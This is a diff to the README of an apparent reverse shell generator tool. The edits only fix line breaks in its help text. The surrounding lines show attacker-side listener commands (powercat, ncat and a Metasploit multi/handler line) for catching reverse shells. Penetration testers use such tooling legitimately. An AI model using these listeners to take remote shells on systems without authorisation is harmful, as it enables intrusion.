@@ -34,7 +34,7 @@ Welcome to the reverse shell generator script. Type 'help' or '?' to list availa
 >> help
 Documented commands (type help <topic>):
 ========================================g
-et  help  ip  list  port  shell
+get  help  ip  list  port  shell
 >> help list
 list [ reverse | listeners | shells | msfvenom ]
 List the available templates, shells or listener commands.
@@ -43,7 +43,8 @@ E.g.: list shells
 get [ reverse | listeners | shells | msfvenom ] [index]
 Generate the actual command with the given options.
 The first parameter specifies which type of the command it's going to be.
-The [index] parameter specifies which template should be used for generating the command.E.g.: get reverse 0
+The [index] parameter specifies which template should be used for generating the command.
+E.g.: get reverse 0
 Use 'list' command for getting the index.
 >>
 ```
@@ -139,5 +140,4 @@ powercat -l -p 5050
 ncat -lvnp 5050
 >> get listeners 11
 msfconsole -q -x "use multi/handler; set payload {payload}; set lhost 192.168.45.19; set lport 5050; exploit"  
-
 ```
